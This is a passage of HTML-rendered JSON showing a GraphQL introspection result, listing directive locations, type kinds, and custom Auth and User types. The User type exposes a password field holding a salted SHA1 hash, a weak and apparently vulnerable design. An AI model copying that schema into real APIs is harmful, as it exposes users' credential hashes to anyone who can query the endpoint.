class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="s2">&#34;Use `locations`.&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;onFragment&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="s2">&#34;Use `locations`.&#34;</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;onOperation&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__Directive&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:[{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FIELD&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a schema definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SCHEMA&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an input object type definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INPUT_OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a mutation operation.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;MUTATION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a scalar definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an enum value definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM_VALUE&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an enum definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a query operation.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;QUERY&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a subscription operation.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SUBSCRIPTION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a fragment definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FRAGMENT_DEFINITION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a fragment spread.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FRAGMENT_SPREAD&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an inline fragment.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INLINE_FRAGMENT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an argument definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ARGUMENT_DEFINITION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a object definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a field definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;FIELD_DEFINITION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an interface definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INTERFACE&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to a union definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;UNION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an input object field definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INPUT_FIELD_DEFINITION&#34;</span><span class="p">}],</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__DirectiveLocation&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Auth info for a user&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The token&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;token&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The user&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;user&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Auth&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;An enum describing what kind of type a given `__Type` is&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:[{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an enum. `enumValues` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an input object. `inputFields` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INPUT_OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a list. `ofType` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a non-null. `ofType` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a scalar.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an object. `fields` and `interfaces` are valid fields.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INTERFACE&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a union. `possibleTypes` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;UNION&#34;</span><span class="p">}],</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__TypeKind&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The `Boolean` scalar type represents `true` or `false`.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deprecationReason&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__EnumValue&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A user of our website&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The id of the user&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;id&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Int&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The salted SHA1 hash of the users password&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The username of the user&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span 